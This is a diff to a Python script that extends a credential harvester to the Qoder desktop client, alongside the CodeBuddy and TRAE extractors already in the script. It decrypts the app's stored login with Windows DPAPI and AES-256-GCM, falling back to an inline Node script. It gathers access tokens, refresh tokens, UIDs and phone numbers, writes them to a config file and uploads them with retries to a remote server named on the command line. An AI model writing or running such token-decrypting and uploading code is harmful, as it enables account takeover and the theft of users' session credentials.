@@ -21,6 +21,8 @@ import hashlib
 import re
 import uuid
 import subprocess
+import ctypes
+from ctypes import wintypes
 
 try:
     sys.stdout.reconfigure(encoding="utf-8", errors="replace")
@@ -209,10 +211,141 @@ process.exit(0);
         print(f"  ⚠️ WorkBuddy 桌面端凭据解析异常: {e}")
     return []
 
+
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [
+        ("cbData", wintypes.DWORD),
+        ("pbData", ctypes.POINTER(ctypes.c_byte))
+    ]
+
+def _dpapi_decrypt(cipher_bytes):
+    try:
+        blob_in = DATA_BLOB(len(cipher_bytes), ctypes.cast(ctypes.create_string_buffer(cipher_bytes), ctypes.POINTER(ctypes.c_byte)))
+        blob_out = DATA_BLOB()
+        res = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
+        if res:
+            out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
+            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
+            return out
+    except Exception:
+        pass
+    return None
+
+def extract_qoder():
+    appdata = os.getenv("APPDATA", "")
+    if not appdata:
+        return []
+    
+    candidates = [
+        ("Qoder CN", os.path.join(appdata, "com.qodercn.app.stable")),
+        ("Qoder", os.path.join(appdata, "com.qoder.app.stable")),
+        ("Qoder", os.path.join(appdata, "Qoder"))
+    ]
+    
+    accounts = []
+    seen_tokens = set()
+    
+    for name, qdir in candidates:
+        auth_file = os.path.join(qdir, "auth.v1.dat")
+        ls_file = os.path.join(qdir, "Local State")
+        if not (os.path.exists(auth_file) and os.path.exists(ls_file)):
+            continue
+        try:
+            with open(ls_file, "r", encoding="utf-8") as f:
+                ls = json.load(f)
+            encrypted_key_b64 = ls.get("os_crypt", {}).get("encrypted_key")
+            if not encrypted_key_b64:
+                continue
+            enc_key = base64.b64decode(encrypted_key_b64)
+            if enc_key.startswith(b"DPAPI"):
+                enc_key = enc_key[5:]
+            master_key = _dpapi_decrypt(enc_key)
+            if not master_key:
+                continue
+
+            with open(auth_file, "rb") as f:
+                raw = f.read()
+
+            if not raw.startswith(b"v10") or len(raw) < 15:
+                continue
+
+            nonce = raw[3:15]
+            ciphertext = raw[15:]
+
+            dec_bytes = None
+            try:
+                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+                aesgcm = AESGCM(master_key)
+                dec_bytes = aesgcm.decrypt(nonce, ciphertext, None)
+            except Exception:
+                pass
+
+            if not dec_bytes:
+                node_candidates = [
+                    os.path.join(os.getenv("LOCALAPPDATA", ""), "Programs", "Qoder CN", "Qoder CN.exe"),
+                    "D:\\Qoder CN\\Qoder CN.exe",
+                    "node"
+                ]
+                for n_exe in node_candidates:
+                    if os.path.exists(n_exe) or n_exe == "node":
+                        js_script = f"""
+const crypto = require('crypto');
+try {{
+    const key = Buffer.from('{base64.b64encode(master_key).decode()}', 'base64');
+    const nonce = Buffer.from('{base64.b64encode(nonce).decode()}', 'base64');
+    const ctWithTag = Buffer.from('{base64.b64encode(ciphertext).decode()}', 'base64');
+    const tag = ctWithTag.slice(-16);
+    const ct = ctWithTag.slice(0, -16);
+    const d = crypto.createDecipheriv('aes-256-gcm', key, nonce);
+    d.setAuthTag(tag);
+    const dec = Buffer.concat([d.update(ct), d.final()]);
+    console.log(dec.toString('utf8'));
+}} catch(e) {{
+    process.exit(1);
+}}
+"""
+                        env = os.environ.copy()
+                        env["ELECTRON_RUN_AS_NODE"] = "1"
+                        try:
+                            proc = subprocess.run([n_exe, "-e", js_script], env=env, capture_output=True, text=True, timeout=5)
+                            if proc.returncode == 0 and proc.stdout.strip():
+                                dec_bytes = proc.stdout.strip().encode("utf-8")
+                                break
+                        except Exception:
+                            continue
+
+            if dec_bytes:
+                info = json.loads(dec_bytes.decode("utf-8", "ignore"))
+                user = info.get("user") or {}
+                tokens = info.get("tokens") or {}
+                tok = info.get("token") or tokens.get("token") or tokens.get("accessToken") or ""
+                rt = info.get("refreshToken") or tokens.get("refreshToken") or ""
+                uid = user.get("id") or info.get("uid") or ""
+                phone = user.get("phone") or ""
+                nick = user.get("name") or user.get("username") or phone or "Qoder用户"
+                
+                if tok and tok not in seen_tokens:
+                    seen_tokens.add(tok)
+                    accounts.append({
+                        "token": tok,
+                        "refreshToken": rt,
+                        "uid": uid,
+                        "phone": phone,
+                        "name": nick,
+                        "source": name,
+                        "expiresAt": info.get("expiresAt") or tokens.get("expiresAt", "")
+                    })
+                    print(f"✅ 成功解密 [{name}] 登录凭据 (账号: {phone or nick}, UID: {uid[:8]}...)")
+        except Exception as e:
+            print(f"⚠️ 解析 [{name}] 凭据失败: {e}")
+
+    return accounts
+
 def extract_all():
     extracted = {
         "codebuddy": [],
-        "trae": []
+        "trae": [],
+        "qoder": []
     }
     seen_cb_uids = set()
     seen_trae_uids = set()
@@ -292,6 +425,9 @@ def extract_all():
                 except Exception as e:
                     print(f"⚠️ 读取 TRAE [{name}] 失败: {e}")
 
+    # 4. 提取 Qoder 客户端凭据 (DPAPI + AES-256-GCM 安全存储)
+    extracted["qoder"] = extract_qoder()
+
     return extracted
 
 def push_to_remote(server_url, key, platform, acc_data):
@@ -308,16 +444,22 @@ def push_to_remote(server_url, key, platform, acc_data):
             if platform == "codebuddy":
                 nick = acc_data.get("nickname") or acc_data.get("phone") or "用户"
                 remark = f"{acc_data.get('source', 'CodeBuddy')} ({nick})"
+            elif platform == "qoder":
+                nick = acc_data.get("name") or acc_data.get("phone") or "Qoder用户"
+                remark = f"{acc_data.get('source', 'Qoder')} ({nick})"
             else:
                 remark = f"TRAE ({acc_data.get('source', '客户端')} UID: {acc_data.get('uid')})"
 
         payload = {
+            "id": acc_data.get("id"),
             "platform": platform,
             "remark": remark,
             "phone": acc_data.get("phone", ""),
-            "accessToken": acc_data.get("accessToken", ""),
+            "accessToken": acc_data.get("accessToken") or acc_data.get("token", ""),
+            "token": acc_data.get("token") or acc_data.get("accessToken", ""),
             "refreshToken": acc_data.get("refreshToken", ""),
             "uid": acc_data.get("uid", ""),
+            "name": acc_data.get("name", ""),
             "deviceId": acc_data.get("deviceId", "766820083601979")
         }
         req = urllib.request.Request(
@@ -329,16 +471,25 @@ def push_to_remote(server_url, key, platform, acc_data):
                 "X-Hub-Key": key
             }
         )
-        with opener.open(req, timeout=10) as resp:
-            res = json.loads(resp.read().decode("utf-8"))
-            if res.get("success"):
-                print(f"  ☁️  远程同步成功 [{platform}] {payload['remark']}: {res.get('message', '账号已入库')}")
-                return True
-            else:
-                print(f"  ⚠️  远程同步失败 [{platform}] {payload['remark']}: {res.get('error')}")
+        for attempt in range(1, 3):
+            try:
+                with opener.open(req, timeout=25) as resp:
+                    res = json.loads(resp.read().decode("utf-8"))
+                    if res.get("success"):
+                        print(f"  ☁️  远程同步成功 [{platform}] {payload['remark']}: {res.get('message', '账号已入库')}")
+                        return True
+                    else:
+                        print(f"  ⚠️  远程同步失败 [{platform}] {payload['remark']}: {res.get('error')}")
+                        return False
+            except Exception as ex:
+                if attempt < 2:
+                    time.sleep(1.5)
+                    continue
+                print(f"  ❌ 远程推送失败 [{platform}]: {ex}")
                 return False
+        return False
     except Exception as e:
-        print(f"  ❌ 远程推送失败 [{platform}]: {e}")
+        print(f"  ❌ 远程推送准备异常 [{platform}]: {e}")
         return False
 
 def main():
@@ -370,6 +521,8 @@ def main():
         cfg["codebuddy_accounts"] = []
     if "trae_accounts" not in cfg:
         cfg["trae_accounts"] = []
+    if "qoder_accounts" not in cfg:
+        cfg["qoder_accounts"] = []
 
     # 追加或更新所有 CodeBuddy 账号
     for cb in data.get("codebuddy", []):
@@ -412,11 +565,34 @@ def main():
                 "enabled": True
             })
 
+    # 追加或更新所有 Qoder 账号
+    for qd in data.get("qoder", []):
+        qd_uid = qd.get("uid", "")
+        qd_token = qd.get("token", "")
+        existing = next((a for a in cfg["qoder_accounts"] if (qd_uid and a.get("uid") == qd_uid) or (qd_token and a.get("token") == qd_token)), None)
+        if existing:
+            existing["token"] = qd_token
+            existing["refreshToken"] = qd.get("refreshToken", "")
+            existing["name"] = qd.get("name", existing.get("name", "Qoder用户"))
+            existing["phone"] = qd.get("phone", existing.get("phone", ""))
+        else:
+            nick = qd.get("name") or qd.get("phone") or "Qoder用户"
+            cfg["qoder_accounts"].append({
+                "id": "qoder_" + uuid.uuid4().hex[:8],
+                "remark": f"{qd.get('source', 'Qoder')} ({nick})",
+                "token": qd_token,
+                "refreshToken": qd.get("refreshToken", ""),
+                "name": nick,
+                "phone": qd.get("phone", ""),
+                "uid": qd_uid,
+                "enabled": True
+            })
+
     with open(out_file, "w", encoding="utf-8") as f:
         json.dump(cfg, f, indent=2, ensure_ascii=False)
 
     print(f"\n🎉 凭证已成功保存至本地配置文件: {out_file}")
-    print(f"📊 当前识别到本地有效账号数: CodeBuddy/WorkBuddy x {len(data['codebuddy'])} 个, TRAE x {len(data['trae'])} 个")
+    print(f"📊 当前识别到本地有效账号数: CodeBuddy/WorkBuddy x {len(data['codebuddy'])} 个, TRAE x {len(data['trae'])} 个, Qoder x {len(data['qoder'])} 个")
 
     remote = args.server
     key = args.key
@@ -432,14 +608,28 @@ def main():
         print(f"\n正在同步到云端服务器: {remote} ...")
         for cb in data.get("codebuddy", []):
             existing = next((a for a in cfg.get("codebuddy_accounts", []) if a.get("uid") == cb.get("uid") and cb.get("uid")), None)
-            if existing and existing.get("remark"):
-                cb["remark"] = existing["remark"]
+            if existing:
+                if existing.get("remark"):
+                    cb["remark"] = existing["remark"]
+                if existing.get("id"):
+                    cb["id"] = existing["id"]
             push_to_remote(remote, key, "codebuddy", cb)
         for trae in data.get("trae", []):
             existing = next((a for a in cfg.get("trae_accounts", []) if a.get("uid") == trae.get("uid") and trae.get("uid")), None)
-            if existing and existing.get("remark"):
-                trae["remark"] = existing["remark"]
+            if existing:
+                if existing.get("remark"):
+                    trae["remark"] = existing["remark"]
+                if existing.get("id"):
+                    trae["id"] = existing["id"]
             push_to_remote(remote, key, "trae", trae)
+        for qd in data.get("qoder", []):
+            existing = next((a for a in cfg.get("qoder_accounts", []) if a.get("uid") == qd.get("uid") and qd.get("uid")), None)
+            if existing:
+                if existing.get("remark"):
+                    qd["remark"] = existing["remark"]
+                if existing.get("id"):
+                    qd["id"] = existing["id"]
+            push_to_remote(remote, key, "qoder", qd)
         print("\n✅ 所有账号远程多账号同步完成！")
 
     print("=" * 64)
